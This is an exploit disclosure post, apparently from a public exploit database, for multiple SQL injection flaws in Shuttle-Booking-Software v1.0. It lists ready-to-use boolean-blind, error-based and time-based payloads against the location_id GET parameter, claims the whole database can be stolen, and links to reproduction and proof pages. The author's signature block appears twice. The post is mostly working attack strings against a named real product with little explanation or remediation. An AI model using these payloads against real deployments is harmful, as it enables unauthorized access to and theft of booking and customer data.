# Multiple-SQLi
Shuttle-Booking-Software v1.0 - Multiple-SQLi
The attacker easily can steal all information from the database of
this web application!
WARNING! All of you: Be careful what you buy! This will be your responsibility!

STATUS: HIGH-CRITICAL Vulnerability

[+]Payload:
```mysql
---
Parameter: location_id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: controller=pjFrontPublic&action=pjActionGetDropoffs&index=348&location_id=3''')
AND 1347=1347 AND ('MVss'='MVss&traveling=from

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or
GROUP BY clause (GTID_SUBSET)
    Payload: controller=pjFrontPublic&action=pjActionGetDropoffs&index=348&location_id=3''')
AND GTID_SUBSET(CONCAT(0x716b786a71,(SELECT
(ELT(9416=9416,1))),0x71706b7071),9416) AND
('dOqc'='dOqc&traveling=from

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: controller=pjFrontPublic&action=pjActionGetDropoffs&index=348&location_id=3''')
AND (SELECT 1087 FROM (SELECT(SLEEP(15)))poqp) AND
('EEYQ'='EEYQ&traveling=from
---
```

## Reproduce:
[href](https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/phpjabbers/2023/Shuttle-Booking-Software-1.0)

## Proof and Exploit:
[href](https://www.nu11secur1ty.com/2023/09/shuttle-booking-software-10-multiple.html)

## Time spent:
01:47:00


-- 
System Administrator - Infrastructure Engineer
Penetration Testing Engineer
Exploit developer at https://packetstormsecurity.com/
https://cve.mitre.org/index.htmlhttps://cxsecurity.com/ and
https://www.exploit-db.com/
0day Exploit DataBase https://0day.today/
home page: https://www.nu11secur1ty.com/
hiPEnIMR0v7QCo/+SEH9gBclAAYWGnPoBIQ75sCj60E=
                          nu11secur1ty <http://nu11secur1ty.com/>


-- 
System Administrator - Infrastructure Engineer
Penetration Testing Engineer
Exploit developer at https://packetstormsecurity.com/
https://cve.mitre.org/index.html
https://cxsecurity.com/ and https://www.exploit-db.com/
0day Exploit DataBase https://0day.today/
home page: https://www.nu11secur1ty.com/
hiPEnIMR0v7QCo/+SEH9gBclAAYWGnPoBIQ75sCj60E=
                          nu11secur1ty <http://nu11secur1ty.com/>
            
